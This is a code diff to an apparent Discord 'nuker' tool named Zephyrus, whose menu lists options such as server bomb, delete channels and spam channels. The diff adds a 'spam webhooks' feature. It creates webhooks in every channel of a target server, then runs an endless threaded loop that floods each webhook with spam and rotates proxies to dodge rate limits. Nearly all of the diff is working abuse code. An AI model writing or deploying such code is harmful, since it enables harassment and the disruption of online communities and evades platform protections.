@@ -41,6 +41,7 @@ webhook_names = zephyrus.get('Webhook-Names')
 spam_messages = zephyrus.get('Spam-Messages')
 guildname = zephyrus.get('Guild-Name')
 langchange = zephyrus.get('Lang')
+doodoo = zephyrus.get('doodoo')
 
 langs = [ 
     "da", "de",
@@ -203,8 +204,25 @@ class zephyrus:
           pass
 
 
+      
+  def spammed(guild, url):#//The main function
+   while True:
+    proxies = open('proxies.txt').read().split('\n')
+    proxy = cycle(proxies)
+    
+    data = {
+      'username':random.choice(webhook_names),
+      'content': doodoo
+    }
+    r = session.post(url, json=data, proxies={"http": 'http://' + next(proxy)})
+    if "retry_after" in r.text:
+                    print(f"{m}{x}{y} ratelimited sleeping for {l}{r.json()['retry_after']}{y} secs.")
+    elif r.status_code == 204:
+                    print(f"{m}{x}{y} Sent Webhook {a}[>>>]{c} {doodoo}")
+    else:
+      pass
 
-
+   
 
   def CreateWebhook(channel):
         try:
@@ -231,6 +249,8 @@ class zephyrus:
         except:
             pass
 
+
+
   async def main():
         os.system(f'cls & title ~ Zephyrus Menu')
         print(f"<zephyrus.main.<locals>.signed in at developer 0x0000A71BX0E2>")
@@ -249,7 +269,7 @@ class zephyrus:
         [ 2 ] server bomb                                           
         [ 3 ] delete channels                                                 
         [ 4 ] spam channels
-        [ 5 ] cycle ban
+        [ 5 ] spam webhooks
         [ 6 ] scrape        
 
         """
@@ -300,6 +320,21 @@ class zephyrus:
             emojis.close
             time.sleep(2)
             await zephyrus.main()
+
+        elif choice == '5':
+         guild = input(f'\t{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Guild ID{Fore.WHITE} [>>>] ')
+         await client.wait_until_ready()
+         guildOBJ = client.get_guild(int(guild))
+         if len(await guildOBJ.webhooks()) == 0:
+          for channel in guildOBJ.channels:
+           try:
+            await       channel.create_webhook(name=random.choice(webhook_names))
+           except:pass
+         else:
+           for webhook in await guildOBJ.webhooks():
+             url = webhook.url
+             for i in range(10):
+              threading.Thread(target=zephyrus.spammed, args=(guild, url,)).start()
 
         elif choice == '3':
           guild = input(f'\t{Style.BRIGHT}{Fore.LIGHTBLACK_EX}Insert Guild ID Here{Fore.WHITE} [>>>] ')
